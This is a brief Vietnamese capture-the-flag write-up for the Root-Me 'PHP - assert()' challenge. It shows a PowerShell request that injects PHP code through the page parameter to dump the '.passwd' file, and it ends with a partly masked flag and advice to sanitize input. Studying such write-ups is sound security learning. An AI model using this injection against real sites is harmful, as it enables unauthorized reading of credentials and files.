# PHP - assert()

## Solution

Khi vào trang web, điều đầu tiên xuất hiện trong đầu là một cuộc tấn công LFI (như các bài viết liên quan đã chỉ ra). Trang web bao gồm một trang được yêu cầu trong URL nhưng tất cả kiến ​​thức về LFI đều không đưa ra được solution

nên sau khi chơi một chút với "?page=", thấy rằng trang đang sử dụng hàm assert() dễ bị tấn công bằng command injection và sau khi xem một số thông tin trên google, có thể tạo một payload bằng PowerShell:

```
“(Invoke-WebRequest "http://challenge01.root-me.org/web-serveur/ch47/?page=about') || var_dump (file_get_contents('.passwd'));// Comment").Content”
```

Và flag được hiển thị trên terminal ;)

```
string(194) "The flag is / Le flag est :

x4Ss3*******n0**4f**7A**x
```

Nhớ sanitize tất cả dữ liệu đầu vào của người dùng! / Hãy cân nhắc việc xác thực tất cả các mục nhập được sử dụng! 

Đừng sử dụng assert! / N'utilisez pas khẳng định !

Peace 😄